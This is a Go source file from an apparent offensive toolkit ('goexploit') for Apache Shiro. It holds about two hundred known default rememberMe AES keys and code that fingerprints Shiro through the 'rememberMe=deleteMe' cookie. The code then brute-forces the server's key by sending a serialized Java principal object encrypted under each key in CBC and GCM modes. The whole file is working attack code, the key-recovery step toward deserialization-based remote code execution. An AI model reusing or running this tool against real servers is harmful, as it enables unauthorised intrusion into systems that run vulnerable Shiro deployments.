package shiroexploit

import (
	"encoding/base64"
	shiroexploit "goexploit/modules/shiroexploit/AES_Encrypt"
	"strings"
)

type Result struct {
	Target      string `json:"target"`
	Keys        string `json:"keys"`
	EncryptType string `json:"encrypt_type"`
}

var Keys = []string{
	"kPH+bIxk5D2deZiIxcaaaA==",
	"vXP33AonIp9bFwGl7aT7rA==",
	"2A2V+RFLUs+eTA3Kpr+dag==",
	"zSyK5Kp6PZAAjlT+eeNMlg==",
	"fsHspZw/92PrS3XrPW+vxw==",
	"6ZmI6I2j3Y+R1aSn5BOlAA==",
	"U3BAbW5nQmxhZGUAAAAAAA==",
	"ertVhmFLUs0KTA3Kprsdag==",
	"MTIzNDU2NzgxMjM0NTY3OA==",
	"FP7qKJzdJOGkzoQzo2wTmA==",
	"b2EAAAAAAAAAAAAAAAAAAA==",
	"pyyX1c5x2f0LZZ7VKZXjKO==",
	"3JvYhmBLUs0ETA5Kprsdag==",
	"4AvVhdsgUs0F563SDFAdag==",
	"O4pdf+7e+mZe8NyxMTPJmQ==",
	"3AvVhdAgUs1FSA4SDFAdBg==",
	"tiVV6g3uZBGfgshesAQbjA==",
	"3AvVhMFLIs0KTA3Kprsdag==",
	"Ymx1ZXdoYWxlAAAAAAAAAA==",
	"oPH+bIxk5E2enZiIxcqaaA==",
	"QF5HMyZAWDZYRyFnSGhTdQ==",
	"Us0KvVhTeasAm43KFLAeng==",
	"Z3VucwACAOVAKALACAADSA==",
	"6AvVhmFLUs0KTA3Kprsdag==",
	"yNeUgSzL/CfiWw1GALg6Ag==",
	"fCq+/xW488hMTCE+cmJ3FF==",
	"MTIzNDU2Nzg5MGFiY2RlZg==",
	"GsHaWo4m1eNbE0kNSMULhg==",
	"sBv2t3okbdm3U0r2EVcSzB==",
	"5AvVhmFLUS0ATA4Kprsdag==",
	"NsZXjXVklWPZwOfkvk6kUA==",
	"3qDVdLawoIr1xFd6ietnsg==",
	"bXdrXl9eNjY2KjA3Z2otPQ==",
	"kPH+bIxk5D2deZiIxcacaA==",
	"s2SE9y32PvLeYo+VGFpcKA==",
	"9Ami6v2G5Y+r5aPnE4OlBB==",
	"6NfXkC7YVCV5DASIrEm1Rg==",
	"Bf7MfkNR0axGGptozrebag==",
	"4AvVhm2LUs0KTA3Kprsdag==",
	"a3dvbmcAAAAAAAAAAAAAAA==",
	"R29yZG9uV2ViAAAAAAAAAA==",
	"4BvVhmFLUs0KTA3Kprsdag==",
	"2AvVhdsgERdsSA3SDFAdag==",
	"bXRvbnMAAAAAAAAAAAAAAA==",
	"Jt3C93kMR9D5e8QzwfsiMw==",
	"FJoQCiz0z5XWz2N2LyxNww==",
	"GHxH6G3LFh8Zb3NwoRgfFA==",
	"Z3VucwAAAAAAAAAAAAAAAA==",
	"3rvVhmFLUs0KAT3Kprsdag==",
	"3AvVhmFLUs0KTA3Kprsdag==",
	"YWJjZGRjYmFhYmNkZGNiYQ==",
	"2AvVCXsxUs0FSA7SYFjdQg==",
	"2AvVhdsgUsOFSA3SDFAdag==",
	"B9rPF8FHhxKJZ9k63ik7kQ==",
	"Cj6LnKZNLEowAZrdqyH/Ew==",
	"66v1O8keKNV3TTcGPK1wzg==",
	"4rvVhmFLUs0KAT3Kprsdag==",
	"5AvVhCsgUs0FSA3SDFAdag==",
	"GhrF5zLfq1Dtadd1jlohhA==",
	"sHdIjUN6tzhl8xZMG3ULCQ==",
	"WkhBTkdYSUFPSEVJX0NBVA==",
	"aU1pcmFjbGVpTWlyYWNsZQ==",
	"YystomRZLMUjiK0Q1+LFdw==",
	"8AvVhmFLUs0KTA3Kprsdag==",
	"Is9zJ3pzNh2cgTHB4ua3+Q==",
	"wrjUh2ttBPQLnT4JVhriug==",
	"ZUdsaGJuSmxibVI2ZHc9PQ==",
	"A7UzJgh1+EWj5oBFi+mSgw==",
	"HWrBltGvEZc14h9VpMvZWw==",
	"8BvVhmFLUs0KTA3Kprsdag==",
	"3AvVhdAgUs0FSA4SDFAdBg==",
	"WcfHGU25gNnTxTlmJMeSpw==",
	"c2hvdWtlLXBsdXMuMjAxNg==",
	"cmVtZW1iZXJNZQAAAAAAAA==",
	"iycgIIyCatQofd0XXxbzEg==",
	"kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
	"RVZBTk5JR0hUTFlfV0FPVQ==",
	"1AvVhdsgUs0FSA3SDFAdag==",
	"fCq+/xW488hMTCD+cmJ3aQ==",
	"4AvVhmFLUs0KTA3KAAAAAA==",
	"25BsmdYwjnfcWmnhAciDDg==",
	"OUHYQzxQ/W9e/UjiAGu6rg==",
	"5AvVhmFLUs0KTA3Kprsdag==",
	"wyLZMDifwq3sW1vhhHpgKA==",
	"AztiX2RUqhc7dhOzl1Mj8Q==",
	"MzVeSkYyWTI2OFVLZjRzZg==",
	"OY//C4rhfwNxCQAQCrQQ1Q==",
	"HeUZ/LvgkO7nsa18ZyVxWQ==",
	"3Av2hmFLAs0BTA3Kprsd6E==",
	"XTx6CKLo/SdSgub+OPHSrw==",
	"HoTP07fJPKIRLOWoVXmv+Q==",
	"UGlzMjAxNiVLeUVlXiEjLw==",
	"L7RioUULEFhRyxM7a2R/Yg==",
	"d2ViUmVtZW1iZXJNZUtleQ==",
	"0AvVhmFLUs0KTA3Kprsdag==",
	"9FvVhtFLUs0KnA3Kprsdyg==",
	"FjbNm1avvGmWE9CY2HqV75==",
	"rPNqM6uKFCyaL10AK51UkQ==",
	"c+3hFGPjbgzGdrC+MHgoRQ==",
	"2cVtiE83c4lIrELJwKGJUw==",
	"QVN1bm5uJ3MgU3Vuc2l0ZQ==",
	"cGhyYWNrY3RmREUhfiMkZA==",
	"bya2HkYo57u6fWh5theAWw==",
	"yeAAo1E8BOeAYfBlm4NG9Q==",
	"2AvVhmFLUs0KTA3Kprsdag==",
	"f/SY5TIve5WWzT4aQlABJA==",
	"2adsfasdqerqerqewradsf==",
	"kPH+bIxk5D2deZiIxcabaA==",
	"w793pPq5ZVBKkj8OhV4KaQ==",
	"cGljYXMAAAAAAAAAAAAAAA==",
	"SkZpbmFsQmxhZGUAAAAAAA==",
	"3qDVdLawoIr1xFd6ietnwg==",
	"WuB+y2gcHRnY2Lg9+Aqmqg==",
	"zIiHplamyXlVB11UXWol8g==",
	"hBlzKg78ajaZuTE0VLzDDg==",
	"SDKOLKn2J1j/2BHjeZwAoQ==",
	"i45FVt72K2kLgvFrJtoZRw==",
	"Y1JxNSPXVwMkyvES/kJGeQ==",
	"TGMPe7lGO/Gbr38QiJu1/w==",
	"4AvVhmFLUs0TTA3Kprsdag==",
	"4AvVhmFLUs0KTA3Kprsdag==",
	"a2VlcE9uR29pbmdBbmRGaQ==",
	"ZAvph3dsQs0FSL3SDFAdag==",
	"U0hGX2d1bnMAAAAAAAAAAA==",
	"NGk/3cQ6F5/UNPRh8LpMIg==",
	"Q01TX0JGTFlLRVlfMjAxOQ==",
	"Z3VucwAAAAAAAAAAAAABBB==",
	"bWljcm9zAAAAAAAAAAAAAA==",
	"c2hpcm9fYmF0aXMzMgAAAA==",
	"bWluZS1hc3NldC1rZXk6QQ==",
	"eXNmAAAAAAAAAAAAAAAAAA==",
	"sgIQrqUVxa1OZRRIK3hLZw==",
	"1QWLxg+NYmxraMoxAXu/Iw==",
	"GAevYnznvgNCURavBhCr1w==",
	"YVd4dmRtVjViM1UlM0QIdn==",
	"HOlg7NHb9potm0n5s4ic0Q==",
	"4AvVhmFLUs5KTA1Kprsdag==",
	"7AvVhmFLUs0KTA3Kprsdag==",
	"QUxQSEFNWVNPRlRCVUlMRA==",
	"AF05JAuyuEB1ouJQ9Y9Phg==",
	"2itfW92XazYRi5ltW0M2yA==",
	"ZnJlc2h6Y24xMjM0NTY3OA==",
	"lT2UvDUmQwewm6mMoiw4Ig==",
	"NoIw91X9GSiCrLCF03ZGZw==",
	"QAk0rp8sG0uJC4Ke2baYNA==",
	"2AvVhdsgUs0FSA3SDFAdag==",
	"empodDEyMwAAAAAAAAAAAA==",
	"2AvVhdsgUs0FSA3SDFAder==",
	"pbnA+Qzen1vjV3rNqQBLHg==",
	"6ZmI6I2j5Y+R5aSn5ZOlAA==",
	"ZjQyMTJiNTJhZGZmYjFjMQ==",
	"YI1+nBV//m7ELrIyDHm6DQ==",
	"m0/5ZZ9L4jjQXn7MREr/bw==",
	"4AvVhmFLUs0KTA3Kprseaf==",
	"5J7bIJIV0LQSN3c9LPitBQ==",
	"4AvVhmFLUsOKTA3Kprsdag==",
	"2AvVidsaUSofSA3SDFAdog==",
	"l8cc6d2xpkT1yFtLIcLHCg==",
	"xVmmoltfpb8tTceuT5R7Bw==",
	"YWdlbnRAZG1AMjAxOHN3Zg==",
	"wGiHplamyXlVB11UXWol8g==",
	"9AvVhmFLUs0KTA3Kprsdag==",
	"XgGkgqGqYrix9lI6vxcrRw==",
	"M2djA70UBBUPDibGZBRvrA==",
	"2AvVhdsgUs0FSA3SaFAdfg==",
	"U3ByaW5nQmxhZGUAAAAAAA==",
	"5aaC5qKm5oqA5pyvAAAAAA==",
	"KU471rVNQ6k7PQL4SqxgJg==",
	"mIccZhQt6EBHrZIyw1FAXQ==",
	"V2hhdCBUaGUgSGVsbAAAAA==",
	"8AvVhdsgUs0FSA3SDFAdag==",
	"YnlhdnMAAAAAAAAAAAAAAA==",
	"s0KTA3mFLUprK4AvVhsdag==",
	"ClLk69oNcA3m+s0jIMIkpg==",
	"6Zm+6I2j5Y+R5aS+5ZOlAA==",
	"4WCZSJyqdUQsije93aQIRg==",
	"QDFCnfkLUs0KTA3Kprsdag==",
	"SrpFBcVD89eTQ2icOD0TMg==",
	"FL9HL9Yu5bVUJ0PDU1ySvg==",
	"1tC/xrDYs8ey+sa3emtiYw==",
	"fdCEiK9YvLC668sS43CJ6A==",
	"5oiR5piv5p2h5ZK46bG8IQ==",
	"A+kWR7o9O0/G/W6aOGesRA==",
	"MPdCMZ9urzEA50JDlDYYDg==",
	"IduElDUpDDXE677ZkhhKnQ==",
	"5RC7uBZLkByfFfJm22q/Zw==",
	"3AvVhmFLUs0KTA3KaTHGFg==",
	"duhfin37x6chw29jsne45m==",
	"ZmFsYWRvLnh5ei5zaGlybw==",
	"Rb5RN+LofDWJlzWAwsXzxg==",
	"r0e3c16IdVkouZgk1TKVMg==",
}

func findTheKey(target string, Shirokeys string, Content []byte) (r *Result) {
	key, _ := base64.StdEncoding.DecodeString(Shirokeys)
	RememberMe1 := shiroexploit.AES_CBC_Encrypt(key, Content) //AES CBC加密
	RememberMe2 := shiroexploit.AES_GCM_Encrypt(key, Content) //AES GCM加密
	if normal, SetCookieAll := HttpRequset(target, RememberMe1); normal && !strings.Contains(SetCookieAll, "rememberMe=deleteMe;") {
		r = &Result{}
		r.Target = target
		r.Keys = Shirokeys
		r.EncryptType = "CBC"
		return r
	}
	if normal, SetCookieAll := HttpRequset(target, RememberMe2); normal && !strings.Contains(SetCookieAll, "rememberMe=deleteMe;") {
		r = &Result{}
		r.Target = target
		r.Keys = Shirokeys
		r.EncryptType = "GCM"
		return r
	}
	return nil
}
func KeyCheck(target string) (r *Result) {
	Content, _ := base64.StdEncoding.DecodeString("rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==")
	for _, v := range Keys {
		r = findTheKey(target, v, Content)
		if r != nil {
			return r
		}
	}
	return nil
}

func ShiroCheck(target string) bool {
	if normal, SetCookieAll := HttpRequset(target, "wotaifu"); normal && strings.Contains(SetCookieAll, "rememberMe=deleteMe;") {
		return true
	} else {
		return false
	}
}
